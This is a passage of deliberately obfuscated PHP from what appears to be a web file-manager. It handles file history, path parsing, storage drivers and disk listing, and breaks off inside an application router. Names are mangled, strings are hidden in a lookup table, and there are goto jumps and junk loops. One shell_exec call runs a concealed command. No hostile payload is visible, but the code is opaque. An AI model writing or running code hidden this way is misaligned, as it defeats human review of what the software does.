{ if ($ÜıÔİİæ[$Ğô¬Ç´Å[445]] == $Ò²’Óşû) { $ƒéàÚŒ[$Ğô¬Ç´Å[415]][$ĞÄãıÉ][$Ğô¬Ç´Å[1289]] = $¬ŸÍ×êñ; self::saveData($ƒéàÚŒ[$Ğô¬Ç´Å[1291]], $ƒéàÚŒ[$Ğô¬Ç´Å[415]]); return !0; } } return !1; } public static function fileInfo($³Ï•Ñã¹, $‰‹™®) { $ÉÇÜ¼ü´ =& $_SERVER[ò«¥Ê‡å]; $«Îí«ç = self::listData($³Ï•Ñã¹); if (!$«Îí«ç) { show_json(LNG($ÉÇÜ¼ü´[107]), !1); } $ƒˆ¿ê°† = $ÉÇÜ¼ü´[12]; foreach ($«Îí«ç[$ÉÇÜ¼ü´[415]] as $Í¤—İÆ¤ => $‹Â üâæ) { if ($‹Â üâæ[$ÉÇÜ¼ü´[445]] != $‰‹™®) { continue; } $ƒˆ¿ê°† = $«Îí«ç[$ÉÇÜ¼ü´[1290]] . $‹Â üâæ[$ÉÇÜ¼ü´[32]]; break; } if (!$ƒˆ¿ê°†) { show_json(LNG($ÉÇÜ¼ü´[107]), !1); } return IO::info($ƒˆ¿ê°†); } public static function fileOut($²¾èˆ“æ, $—Ô£šå, $®²·¦  = false) { $Ÿ—“Ó¦ª =& $_SERVER[ò«¥Ê‡å]; $“™óù¯† = self::fileInfo($²¾èˆ“æ, $—Ô£šå); $ˆâ¯âÄ½ =& $GLOBALS[$Ÿ—“Ó¦ª[7]]; $®²·¦  = isset($ˆâ¯âÄ½[$Ÿ—“Ó¦ª[1241]]) && $ˆâ¯âÄ½[$Ÿ—“Ó¦ª[1241]] == 1; if (isset($ˆâ¯âÄ½[$Ÿ—“Ó¦ª[33]]) && $ˆâ¯âÄ½[$Ÿ—“Ó¦ª[33]] == $Ÿ—“Ó¦ª[1292]) { return IO::fileOutImage($“™óù¯†[$Ÿ—“Ó¦ª[86]], $ˆâ¯âÄ½[$Ÿ—“Ó¦ª[1293]]); } IO::fileOut($“™óù¯†[$Ÿ—“Ó¦ª[86]], $®²·¦ , get_path_this($²¾èˆ“æ)); } public static function listData($„ÑêõÃÃ, $‹Éø¡ññ = true) { $÷ÚÁ´‚à =& $_SERVER[ò«¥Ê‡å]; if ($‹Éø¡ññ && !IO::exist($„ÑêõÃÃ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($„ÑêõÃÃ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ç’ğÍüÌ = self::pathHistory($„ÑêõÃÃ); $¿û¡«Ç’ = array($÷ÚÁ´‚à[1291] => $ç’ğÍüÌ . $÷ÚÁ´‚à[1278], $÷ÚÁ´‚à[1290] => rtrim(get_path_father($ç’ğÍüÌ), $÷ÚÁ´‚à[8]) . $÷ÚÁ´‚à[8], $÷ÚÁ´‚à[415] => array()); $¿¾§ˆÉ• = IO::getContent($¿û¡«Ç’[$÷ÚÁ´‚à[1291]]); if ($¿¾§ˆÉ•) { $ßã½®Ü‰ = json_decode($¿¾§ˆÉ•, !0); if (is_array($ßã½®Ü‰)) { $¿û¡«Ç’[$÷ÚÁ´‚à[415]] = $ßã½®Ü‰; } } return $¿û¡«Ç’; } private static function saveData($Í¼¿ø­‘, $›Æƒû˜ö) { $Ù²Ù…›´ =& $_SERVER[ò«¥Ê‡å]; self::log($Ù²Ù…›´[1294] . $Í¼¿ø­‘ . $Ù²Ù…›´[73] . count($›Æƒû˜ö), $Ù²Ù…›´[790]); if ($›Æƒû˜ö) { return IO::setContent($Í¼¿ø­‘, json_encode($›Æƒû˜ö)); } $ÍçŒÚ² = IO::pathFather($Í¼¿ø­‘); IO::remove($Í¼¿ø­‘); self::clearEmptyFolder($ÍçŒÚ²); return !0; } public static function clearEmptyFolder($ÊÑÒ€¥ ) { $Ê¡Àû„ü =& $_SERVER[ò«¥Ê‡å]; if (trim($ÊÑÒ€¥ , $Ê¡Àû„ü[8]) == trim(self::$_historyBase, $Ê¡Àû„ü[8])) { return; } $ÜšÚ°‹· = IO::pathFather($ÊÑÒ€¥ ); $èÖ”À¦Ò = IO::has($ÊÑÒ€¥ , !0); if ($èÖ”À¦Ò[$Ê¡Àû„ü[225]] > 0 || $èÖ”À¦Ò[$Ê¡Àû„ü[226]] > 0) { return; } IO::remove($ÊÑÒ€¥ ); self::clearEmptyFolder($ÜšÚ°‹·); } private static function getBasePath() { $£ÙÌª¦Ü =& $_SERVER[ò«¥Ê‡å]; $ÃéÊ‰Ñô = Model($£ÙÌª¦Ü[1295])->get($£ÙÌª¦Ü[1296]); if ($ÃéÊ‰Ñô) { if (!IO::exist($ÃéÊ‰Ñô)) { IO::mkdir($ÃéÊ‰Ñô); } if (get_path_this($ÃéÊ‰Ñô) == $£ÙÌª¦Ü[1281]) { $êë„„¨ = $£ÙÌª¦Ü[1297] . rand_string(8); @rename($ÃéÊ‰Ñô, get_path_father($ÃéÊ‰Ñô) . $£ÙÌª¦Ü[8] . $êë„„¨); $ÃéÊ‰Ñô = DATA_PATH . $êë„„¨ . $£ÙÌª¦Ü[8]; file_put_contents(DATA_PATH . $£ÙÌª¦Ü[1231], $£ÙÌª¦Ü[12]); Model($£ÙÌª¦Ü[1295])->set($£ÙÌª¦Ü[1296], $ÃéÊ‰Ñô); } return $ÃéÊ‰Ñô; } $ÃéÊ‰Ñô = DATA_PATH . $£ÙÌª¦Ü[1297] . rand_string(8) . $£ÙÌª¦Ü[8]; $ÃéÊ‰Ñô = IO::mkdir($ÃéÊ‰Ñô); $ÃéÊ‰Ñô = rtrim($ÃéÊ‰Ñô, $£ÙÌª¦Ü[8]) . $£ÙÌª¦Ü[8]; file_put_contents($ÃéÊ‰Ñô . $£ÙÌª¦Ü[1231], $£ÙÌª¦Ü[12]); file_put_contents(DATA_PATH . $£ÙÌª¦Ü[1231], $£ÙÌª¦Ü[12]); Model($£ÙÌª¦Ü[1295])->set($£ÙÌª¦Ü[1296], $ÃéÊ‰Ñô); return $ÃéÊ‰Ñô; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\145\x72\122\x65\143\171\x63\154\x65\175"; const KOD_USER_FAV = "\173\165\163\x65\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\x72\x46\x69\154\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\x46\151\154\145\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\165\160\x52\x6f\157\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\173\165\163\x65\x72\x53\150\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\x72\123\150\141\162\x65\114\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\x65\124\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\x72\x65\111\164\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\162\145\x49\164\145\155\x4c\151\156\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\x65\141\x72\x63\150\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\x6b\x7d"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\x73\145\x72\x52\x65\156\143\x65\156\164\175"; const KOD_USER_DRIVER = "\173\x64\162\151\x76\145\162\x7d"; public static function typeList() { $­ÜÇçà  =& $_SERVER[ò«¥Ê‡å]; return array($­ÜÇçà [1298] => self::KOD_SOURCE, $­ÜÇçà [1299] => self::KOD_USER_RECYCLE, $­ÜÇçà [1300] => self::KOD_USER_FAV, $­ÜÇçà [1301] => self::KOD_USER_FILE_TAG, $­ÜÇçà [1302] => self::KOD_USER_FILE_TYPE, $­ÜÇçà [1303] => self::KOD_GROUP_ROOT_SELF, $­ÜÇçà [1304] => self::KOD_USER_SHARE, $­ÜÇçà [1305] => self::KOD_USER_SHARE_LINK, $­ÜÇçà [1306] => self::KOD_USER_SHARE_TO_ME, $­ÜÇçà [1307] => self::KOD_SHARE_ITEM, $­ÜÇçà [1308] => self::KOD_SHARE_LINK, $­ÜÇçà [1309] => self::KOD_SEARCH, $­ÜÇçà [1310] => self::KOD_BLOCK, $­ÜÇçà [1311] => self::KOD_IO, $­ÜÇçà [1312] => self::KOD_USER_RECENT, $­ÜÇçà [1313] => self::KOD_USER_DRIVER); } public static function parse($ßŞ¿·®Î) { $×Îšı¾¢ =& $_SERVER[ò«¥Ê‡å]; $ßŞ¿·®Î = self::clear($ßŞ¿·®Î); $ãßµ¢¢ = array_values(self::typeList()); preg_match($×Îšı¾¢[1314], $ßŞ¿·®Î, $”Çº¾’˜); $àï„°ºî = array($×Îšı¾¢[466] => !1, $×Îšı¾¢[1315] => !1, $×Îšı¾¢[463] => !1, $×Îšı¾¢[86] => $ßŞ¿·®Î, $×Îšı¾¢[1216] => !1, $×Îšı¾¢[1215] => $×Îšı¾¢[12]); if (is_array($”Çº¾’˜) && count($”Çº¾’˜) == 5) { $Ôö†¯™¿ = $×Îšı¾¢[1316] . $”Çº¾’˜[2] . $×Îšı¾¢[373]; if (in_array($Ôö†¯™¿, $ãßµ¢¢)) { $àï„°ºî[$×Îšı¾¢[1216]] = $”Çº¾’˜[1]; $àï„°ºî[$×Îšı¾¢[33]] = $Ôö†¯™¿; $àï„°ºî[$×Îšı¾¢[1317]] = substr($Ôö†¯™¿, 1, -1); $àï„°ºî[$×Îšı¾¢[445]] = $”Çº¾’˜[3]; } $àï„°ºî[$×Îšı¾¢[1215]] = $”Çº¾’˜[4]; } $ô·‚…· = array($×Îšı¾¢[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $àï„°ºî[$×Îšı¾¢[1280]] = in_array($àï„°ºî[$×Îšı¾¢[33]], $ô·‚…·); return $àï„°ºî; } public static function isTruePath($Ùöà–Ç) { $ñ»†Ôó =& $_SERVER[ò«¥Ê‡å]; if (substr($Ùöà–Ç, 0, 1) != $ñ»†Ôó[1316]) { return !0; } if (strpos($Ùöà–Ç, $ñ»†Ôó[453]) === 0) { return !0; } if (strpos($Ùöà–Ç, $ñ»†Ôó[1284]) === 0) { return !0; } if (strpos($Ùöà–Ç, $ñ»†Ôó[1318]) === 0) { return !0; } if (strpos($Ùöà–Ç, $ñ»†Ôó[1319]) === 0) { return !0; } if (strpos($Ùöà–Ç, $ñ»†Ôó[1320]) === 0) { return !0; } return !1; } public static function clear($ĞÏš¤‹Á) { $øùÙ™¼ğ =& $_SERVER[ò«¥Ê‡å]; $ĞÏš¤‹Á = str_replace(array($øùÙ™¼ğ[1125], $øùÙ™¼ğ[248]), $øùÙ™¼ğ[53], $ĞÏš¤‹Á); $ĞÏš¤‹Á = str_replace($øùÙ™¼ğ[99], $øùÙ™¼ğ[8], $ĞÏš¤‹Á); $¿Äõßêö = $øùÙ™¼ğ[1321]; if (substr($ĞÏš¤‹Á, 0, 3) == $øùÙ™¼ğ[1322]) { $ĞÏš¤‹Á = substr($ĞÏš¤‹Á, 3); } while (strstr($ĞÏš¤‹Á, $¿Äõßêö)) { $ĞÏš¤‹Á = str_replace($¿Äõßêö, $øùÙ™¼ğ[8], $ĞÏš¤‹Á); } $ĞÏš¤‹Á = preg_replace($øùÙ™¼ğ[1323], $øùÙ™¼ğ[8], $ĞÏš¤‹Á); if ($ĞÏš¤‹Á == $øùÙ™¼ğ[8]) { return $øùÙ™¼ğ[8]; } $ĞÏš¤‹Á = rtrim($ĞÏš¤‹Á, $øùÙ™¼ğ[8]); return $ĞÏš¤‹Á; } public static function pathTrue($Ï±øÓÖ±) { $Ğıï™ƒÔ =& $_SERVER[ò«¥Ê‡å]; if (!$Ï±øÓÖ±) { return $Ğıï™ƒÔ[12]; } $Ï±øÓÖ± = str_replace($Ğıï™ƒÔ[563], $Ğıï™ƒÔ[8], str_replace($Ğıï™ƒÔ[1324], $Ğıï™ƒÔ[8], $Ï±øÓÖ±)); $Ï±øÓÖ± = str_replace($Ğıï™ƒÔ[563], $Ğıï™ƒÔ[8], str_replace($Ğıï™ƒÔ[1324], $Ğıï™ƒÔ[8], $Ï±øÓÖ±)); if (!strstr($Ï±øÓÖ±, $Ğıï™ƒÔ[1322])) { return $Ï±øÓÖ±; } $¸İÓÕË = explode($Ğıï™ƒÔ[8], $Ï±øÓÖ±); foreach ($¸İÓÕË as $…™İµçÉ => $èş•¾«¬) { if ($èş•¾«¬ !== $Ğıï™ƒÔ[1325]) { continue; } for ($¨ó½Ğ·Ã = $…™İµçÉ; $¨ó½Ğ·Ã >= 0; $¨ó½Ğ·Ã--) { if ($¸İÓÕË[$¨ó½Ğ·Ã] === $Ğıï™ƒÔ[10] || $¸İÓÕË[$¨ó½Ğ·Ã] === $Ğıï™ƒÔ[1325] || $¸İÓÕË[$¨ó½Ğ·Ã] === -1) { continue; } if ($¸İÓÕË[$¨ó½Ğ·Ã] === $Ğıï™ƒÔ[12]) { $¸İÓÕË[$…™İµçÉ] = -1; break; } $¸İÓÕË[$…™İµçÉ] = -1; $¸İÓÕË[$¨ó½Ğ·Ã] = -1; break; } } $íÑ¥Ó‰ = array(); foreach ($¸İÓÕË as $èş•¾«¬) { if ($èş•¾«¬ !== -1) { $íÑ¥Ó‰[] = $èş•¾«¬; } } $‡£ãêüæ = implode($Ğıï™ƒÔ[8], $íÑ¥Ó‰); if (strpos($‡£ãêüæ, $Ğıï™ƒÔ[1326]) === 0) { $‡£ãêüæ = $Ğıï™ƒÔ[1322] . substr($‡£ãêüæ, strlen($Ğıï™ƒÔ[1326])); } return $‡£ãêüæ; } public static function sourceID($¬±°´¶) { $ğ¯ÖÜ‡è =& $_SERVER[ò«¥Ê‡å]; $ö¾“ÂÁ£ = self::parse($¬±°´¶); if ($ö¾“ÂÁ£[$ğ¯ÖÜ‡è[33]] !== self::KOD_SOURCE) { show_json(LNG($ğ¯ÖÜ‡è[1327]), !1); } return $ö¾“ÂÁ£[$ğ¯ÖÜ‡è[445]]; } public static function make($Ğù³Œ) { if (!$Ğù³Œ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ğù³Œ)); } public static function makeShare($ã­µàŞĞ, $ÒÏîÔ½•) { return self::makePath(self::KOD_SHARE_ITEM, $ã­µàŞĞ, $ÒÏîÔ½•); } public static function makeFileTypePath($ÀğÄ‹) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÀğÄ‹); } public static function makeFileTagPath($˜ååÌšÉ) { return self::makePath(self::KOD_USER_FILE_TAG, $˜ååÌšÉ); } public static function makePath($áÙ…Âï , $Ì–…ğ˜” = '', $ëò£–ª = '') { $ˆÁœ¨¿ç =& $_SERVER[ò«¥Ê‡å]; $Ÿú¤Ø•ş = substr($áÙ…Âï , 1, -1); $µÉ ­Ò = $ˆÁœ¨¿ç[1328] . $Ÿú¤Ø•ş . $ˆÁœ¨¿ç[1329] . $Ì–…ğ˜” . $ˆÁœ¨¿ç[1330]; $µÉ ­Ò = $ëò£–ª ? $µÉ ­Ò . $ëò£–ª . $ˆÁœ¨¿ç[8] : $µÉ ­Ò; return $µÉ ­Ò; } public static function hashPath($ëş„ÎÒ, $—‡ËÒË— = true) { $­û˜·Æ =& $_SERVER[ò«¥Ê‡å]; $ªéù†ì“ = is_array($ëş„ÎÒ) ? $ëş„ÎÒ : IO::info($ëş„ÎÒ); $™«ÆÌã‘ = _get($ªéù†ì“, $­û˜·Æ[1331], $­û˜·Æ[12]); if (!$™«ÆÌã‘ && isset($ªéù†ì“[$­û˜·Æ[221]])) { $™«ÆÌã‘ = trim($ªéù†ì“[$­û˜·Æ[221]], $­û˜·Æ[120]); } if (!$™«ÆÌã‘ && isset($ªéù†ì“[$­û˜·Æ[183]]) && $ªéù†ì“[$­û˜·Æ[183]]) { $ªéù†ì“ = IO::info(KodIO::make($ªéù†ì“[$­û˜·Æ[183]])); $™«ÆÌã‘ = _get($ªéù†ì“, $­û˜·Æ[1331], $­û˜·Æ[12]); } $¹˜ÁîÃ™ = md5($ªéù†ì“[$­û˜·Æ[86]] . $ªéù†ì“[$­û˜·Æ[78]] . $ªéù†ì“[$­û˜·Æ[87]]); if (!$™«ÆÌã‘ && file_exists($ªéù†ì“[$­û˜·Æ[86]])) { $™«ÆÌã‘ = Cache::get($¹˜ÁîÃ™ . $­û˜·Æ[1332]); $™«ÆÌã‘ = !1; if (!$™«ÆÌã‘) { $™«ÆÌã‘ = IO::hashSimple($ªéù†ì“[$­û˜·Æ[86]]); Cache::set($¹˜ÁîÃ™ . $­û˜·Æ[1332], $™«ÆÌã‘, 3600 * 24 * 30); } } if ($—‡ËÒË— && !$™«ÆÌã‘) { } return $™«ÆÌã‘ ? $™«ÆÌã‘ : $¹˜ÁîÃ™; } public static function hashPathSafe($ˆŒå¾ü, $¥ƒö‹´ = true) { $½‹Ûœ© =& $_SERVER[ò«¥Ê‡å]; $ôÂİ¢ı¼ = self::hashPath($ˆŒå¾ü, $¥ƒö‹´); return md5($ôÂİ¢ı¼ . $½‹Ûœ©[1333] . Model($½‹Ûœ©[809])->get($½‹Ûœ©[810])); } public static function initSystemPath() { $¬¼æó£Ö =& $_SERVER[ò«¥Ê‡å]; if (defined($¬¼æó£Ö[1334])) { return; } define($¬¼æó£Ö[1334], self::systemPath($¬¼æó£Ö[181])); define($¬¼æó£Ö[1335], self::systemPath($¬¼æó£Ö[1336])); define($¬¼æó£Ö[1337], self::systemPath($¬¼æó£Ö[1338])); define($¬¼æó£Ö[1339], self::systemPath($¬¼æó£Ö[1340])); IOHistory::bindEvent(); } public static function systemPath($¶ãíÃÏ·) { $®ñ´ù¯ =& $_SERVER[ò«¥Ê‡å]; $û²ËËö = $®ñ´ù¯[1341] . ucfirst($¶ãíÃÏ·); $»à”®ğ– = Model($®ñ´ù¯[809])->get($û²ËËö); if ($»à”®ğ–) { return $»à”®ğ–; } if ($¶ãíÃÏ· == $®ñ´ù¯[181]) { $»à”®ğ– = self::make(Model($®ñ´ù¯[871])->systemRootPathAdd($®ñ´ù¯[576])); } else { $»à”®ğ– = self::systemPath($®ñ´ù¯[181]); $ßòåÙ  = self::sourceID($»à”®ğ–); $»à”®ğ– = self::make(Model($®ñ´ù¯[871])->mkdir($ßòåÙ , $¶ãíÃÏ·)); } Model($®ñ´ù¯[809])->set($û²ËËö, $»à”®ğ–); return $»à”®ğ–; } public static function systemFolder($èíŸÜ½‘) { $×³ûèî = IO_PATH_SYSTEM_SOURCE . $èíŸÜ½‘; $…·²¡ó = Cache::get($×³ûèî); if (!$…·²¡ó) { $²ıË”Ò¢ = IO::infoFullSimple($×³ûèî); if (!$²ıË”Ò¢) { $…·²¡ó = IO::mkdir($×³ûèî, REPEAT_SKIP); } else { $…·²¡ó = $²ıË”Ò¢[$_SERVER[ò«¥Ê‡å][86]]; } Cache::set($×³ûèî, $…·²¡ó, 3600 * 10); } return $…·²¡ó; } public static function defaultDriver() { return Model($_SERVER[ò«¥Ê‡å][806])->defaultDriver(); } public static function defaultIO() { $¼Ôì¢Ö =& $_SERVER[ò«¥Ê‡å]; $ò †·ø² = self::defaultDriver(); return $¼Ôì¢Ö[1342] . $ò †·ø²[$¼Ôì¢Ö[445]] . $¼Ôì¢Ö[1330]; } public static function defaultDriverInit() { static $ş®Í…Šè = false; if ($ş®Í…Šè) { return $ş®Í…Šè; } $ş®Í…Šè = IO::init(self::defaultIO()); return $ş®Í…Šè; } public static function fileTypeList() { $ºÅØª½ =& $_SERVER[ò«¥Ê‡å]; $–ê€†÷‰ = $GLOBALS[$ºÅØª½[6]][$ºÅØª½[1343]]; foreach ($–ê€†÷‰ as $òö©Í÷ => $Ò«£¥Ï) { $íàãÎ¦· = $ºÅØª½[1344] . $òö©Í÷; $½ŒÉÓÕå = LNG($íàãÎ¦·); if ($íàãÎ¦· != $½ŒÉÓÕå) { $–ê€†÷‰[$òö©Í÷][$ºÅØª½[32]] = $½ŒÉÓÕå; } } return $–ê€†÷‰; } public static function diskList($¹Ôó¬ò = true) { $ÑÎ°µÉÒ = $_SERVER[ò«¥Ê‡å][1345]; if ($¹Ôó¬ò) { $§Ñ¨òŞì = Cache::get($ÑÎ°µÉÒ); if (is_array($§Ñ¨òŞì)) { return $§Ñ¨òŞì; } } $§Ñ¨òŞì = self::diskListGet(); Cache::set($ÑÎ°µÉÒ, $§Ñ¨òŞì, 60); return $§Ñ¨òŞì; } public static function diskListGet() { $»®ƒÅÖş =& $_SERVER[ò«¥Ê‡å]; $îÁ»—¾ = array(); if ($GLOBALS[$»®ƒÅÖş[6]][$»®ƒÅÖş[1346]] == $»®ƒÅÖş[1347]) { $—ï™Ï¿Ñ = $»®ƒÅÖş[1348]; for ($“ ŸÏ’ = 0; $“ ŸÏ’ < strlen($—ï™Ï¿Ñ); $“ ŸÏ’++) { $Á®‹„‰Ø = $—ï™Ï¿Ñ[$“ ŸÏ’] . $»®ƒÅÖş[1349]; if (file_exists($Á®‹„‰Ø)) { $îÁ»—¾[] = $Á®‹„‰Ø; } } return $îÁ»—¾; } if (!function_exists($»®ƒÅÖş[100])) { $îÁ»—¾[] = $»®ƒÅÖş[882]; return $îÁ»—¾; } $®Èß§•¸ = explode($»®ƒÅÖş[248], shell_exec($»®ƒÅÖş[1350])); array_shift($®Èß§•¸); array_pop($®Èß§•¸); $‰™ô¡€ = array($»®ƒÅÖş[1351], $»®ƒÅÖş[1352], $»®ƒÅÖş[1353], $»®ƒÅÖş[1354], $»®ƒÅÖş[1355], $»®ƒÅÖş[1356], $»®ƒÅÖş[1357], $»®ƒÅÖş[1358]); foreach ($®Èß§•¸ as $Œá«Í¿) { $ÁüÔ£Ìƒ = preg_split($»®ƒÅÖş[1359], $Œá«Í¿); $Á®‹„‰Ø = $ÁüÔ£Ìƒ[count($ÁüÔ£Ìƒ) - 1]; if (!strstr($ÁüÔ£Ìƒ[0], $»®ƒÅÖş[1360]) || !$Á®‹„‰Ø) { continue; } $¼µÛ›«â = rtrim($Á®‹„‰Ø, $»®ƒÅÖş[8]) . $»®ƒÅÖş[8]; if (in_array($¼µÛ›«â, $‰™ô¡€)) { continue; } $îÁ»—¾[] = $¼µÛ›«â; } return $îÁ»—¾; } public static function isSameDisk($À‰Ğ¯÷ê, $êÎĞšúù) { $ÉÒ‰øù÷ =& $_SERVER[ò«¥Ê‡å]; if ($GLOBALS[$ÉÒ‰øù÷[6]][$ÉÒ‰øù÷[1346]] == $ÉÒ‰øù÷[1347]) { return strtolower(substr($À‰Ğ¯÷ê, 0, 1)) == strtolower(substr($êÎĞšúù, 0, 1)); } $¬„øš¿ƒ = self::diskList(); $²èİ©§» = !1; $ê±œƒü› = !1; sort($¬„øš¿ƒ); $¬„øš¿ƒ = array_reverse($¬„øš¿ƒ); $À‰Ğ¯÷ê = rtrim($À‰Ğ¯÷ê, $ÉÒ‰øù÷[8]) . $ÉÒ‰øù÷[8]; $êÎĞšúù = rtrim($êÎĞšúù, $ÉÒ‰øù÷[8]) . $ÉÒ‰øù÷[8]; foreach ($¬„øš¿ƒ as $´ûİ­µê) { $•Éƒ‡“« = strlen($´ûİ­µê); if (!$²èİ©§» && substr($À‰Ğ¯÷ê, 0, $•Éƒ‡“«) == $´ûİ­µê) { $²èİ©§» = $´ûİ­µê; } if (!$ê±œƒü› && substr($êÎĞšúù, 0, $•Éƒ‡“«) == $´ûİ­µê) { $ê±œƒü› = $´ûİ­µê; } if ($²èİ©§» && $ê±œƒü›) { break; } } return $²èİ©§» === $ê±œƒü›; } public static function transferType($º–ÌÒ¥Ï, $ÛÊòç™ë) { $‹¾°ÙØ÷ =& $_SERVER[ò«¥Ê‡å]; $‡¢â¥ƒ = self::driverType($º–ÌÒ¥Ï); $—èŒìÒ = self::driverType($ÛÊòç™ë); if ($‡¢â¥ƒ[$‹¾°ÙØ÷[33]] == $—èŒìÒ[$‹¾°ÙØ÷[33]] && $‡¢â¥ƒ[$‹¾°ÙØ÷[1361]] == $—èŒìÒ[$‹¾°ÙØ÷[1361]]) { return $‹¾°ÙØ÷[1362]; } if ($‡¢â¥ƒ[$‹¾°ÙØ÷[33]] == $‹¾°ÙØ÷[915] && $—èŒìÒ[$‹¾°ÙØ÷[33]] == $‹¾°ÙØ÷[108]) { return $‹¾°ÙØ÷[1241]; } if ($‡¢â¥ƒ[$‹¾°ÙØ÷[33]] == $‹¾°ÙØ÷[108] && $—èŒìÒ[$‹¾°ÙØ÷[33]] == $‹¾°ÙØ÷[915]) { return $‹¾°ÙØ÷[109]; } return $‹¾°ÙØ÷[1363]; } public static function driverType($Š‹‘½ª) { $‹¦²ŒÜª =& $_SERVER[ò«¥Ê‡å]; $Åº‹“µ‰ = str_replace($‹¦²ŒÜª[1364], $‹¦²ŒÜª[12], strtolower($Š‹‘½ª->getType())); if ($Åº‹“µ‰ == $‹¦²ŒÜª[796] || $Åº‹“µ‰ == $‹¦²ŒÜª[1365] || $Åº‹“µ‰ == $‹¦²ŒÜª[1366]) { $Š‹‘½ª = self::defaultDriverInit(); } else { if ($Åº‹“µ‰ == $‹¦²ŒÜª[1251] || $Åº‹“µ‰ == $‹¦²ŒÜª[1367]) { $Š‹‘½ª = IO::init($Š‹‘½ª->pathParse[$‹¦²ŒÜª[1198]]); } } $Ÿœ‹ÆĞƒ = $Š‹‘½ª->path; $Åº‹“µ‰ = str_replace($‹¦²ŒÜª[1364], $‹¦²ŒÜª[12], strtolower($Š‹‘½ª->getType())); if ($Åº‹“µ‰ == $‹¦²ŒÜª[108]) { return array($‹¦²ŒÜª[33] => $‹¦²ŒÜª[108], $‹¦²ŒÜª[1361] => $‹¦²ŒÜª[12], $‹¦²ŒÜª[86] => $Ÿœ‹ÆĞƒ, $‹¦²ŒÜª[97] => $Š‹‘½ª); } return array($‹¦²ŒÜª[33] => $‹¦²ŒÜª[915], $‹¦²ŒÜª[1361] => $Š‹‘½ª->pathDriver, $‹¦²ŒÜª[86] => $Ÿœ‹ÆĞƒ, $‹¦²ŒÜª[97] => $Š‹‘½ª); } public static function pathDriverType($ƒø­íÄã) { return $ƒø­íÄã ? self::driverType(IO::init($ƒø­íÄã)) : !1; } public static function pathDriverLocal($×¸ÁËê’) { $³¾Û©¤ç =& $_SERVER[ò«¥Ê‡å]; $‹û÷ƒ¬ì = $×¸ÁËê’ ? self::driverType(IO::init($×¸ÁËê’)) : !1; return $‹û÷ƒ¬ì[$³¾Û©¤ç[33]] == $³¾Û©¤ç[108] ? !0 : !1; } public static function allowCover($™£’‘Ó, $ØÒªşèÛ = true) { $–ùâ‹…Í =& $_SERVER[ò«¥Ê‡å]; if (is_string($™£’‘Ó)) { $™£’‘Ó = IO::info($™£’‘Ó); } if (!$™£’‘Ó || $™£’‘Ó[$–ùâ‹…Í[33]] == $–ùâ‹…Í[77] || $™£’‘Ó[$–ùâ‹…Í[78]] <= 100) { return !1; } if (isset($™£’‘Ó[$–ùâ‹…Í[1368]]) || !$™£’‘Ó[$–ùâ‹…Í[86]]) { return !1; } if (isset($™£’‘Ó[$–ùâ‹…Í[218]]) && !$™£’‘Ó[$–ùâ‹…Í[218]]) { return !1; } static $§‹‡İ‚› = false; if (!$§‹‡İ‚› || !$ØÒªşèÛ) { $â¼àğÖÚ = self::driverType(IO::init($™£’‘Ó[$–ùâ‹…Í[86]])); $Şˆ¯óÓØ = $â¼àğÖÚ[$–ùâ‹…Í[97]]; $§‹‡İ‚› = $–ùâ‹…Í[186]; if ($â¼àğÖÚ[$–ùâ‹…Í[33]] == $–ùâ‹…Í[108]) { $§‹‡İ‚› = $–ùâ‹…Í[1369]; } if ($â¼àğÖÚ[$–ùâ‹…Í[97]] && is_array($â¼àğÖÚ[$–ùâ‹…Í[97]]->config)) { $¤‡„ãêÕ = $â¼àğÖÚ[$–ùâ‹…Í[97]]->config; if (isset($¤‡„ãêÕ[$–ùâ‹…Í[1370]]) && $¤‡„ãêÕ[$–ùâ‹…Í[1370]]) { $§‹‡İ‚› = $–ùâ‹…Í[1369]; } } } return $§‹‡İ‚› == $–ùâ‹…Í[1369] ? !0 : !1; } } goto CÃŒ©ˆš¬É; bèø¢ùö½: $vszlmakioh = $_SERVER[ò«¥Ê‡å][652]; while (strlen($vszlmakioh) < $_SERVER[ò«¥Ê‡å][653]) { if (!$vszlmakioh) { break; } $vszlmakioh++; } class Application { private $defaultModule = "\x69\156\x64\145\170"; private $defaultController = "\151\x6e\x64\x65\x78"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($Õ’¯­µè) { $Š¾±’‹ =& $_SERVER[ò«¥Ê‡å]; $€óìø¥Ë =& $_SERVER[¤±ª…ß¤]; $²Óº©û = explode($€óìø¥Ë[0], trim($Õ’¯­µè, $€óìø¥Ë[0])); $this->defaultModule = $²Óº©û[0] ? $²Óº©û[0] : $this->defaultModule; $ñ˜¹²å = $Š¾±’‹[654]; $this->defaultController = $²Óº©û[1] ? $²Óº©û[1] : $this->defaultController; $âœÃ“ô = $Š¾±’‹[655]; $this->defaultAction = $²Óº©û[2] ? $²Óº©û[2] : $this->defaultAction; $‘¿º¯ºì = $Š¾±’‹[656]; $this->jnra7e19ef71($€óìø¥Ë[1], array($this, $€óìø¥Ë[2])); } public function appRun($µáÄ’ß¬) { $ÄšäãØø =& $_SERVER[ò«¥Ê‡å]; $«ÒÉığ =& $_SERVER[¤±ª…ß¤]; $ĞÍ°…ğŞ = explode($«ÒÉığ[0], $µáÄ’ß¬); $î™°–‡Š = $ÄšäãØø[657]; while ($î™°–‡Š < $ÄšäãØø[653]) { if ($î™°–‡Š >= 0) { break; } $î™°–‡Š++; } 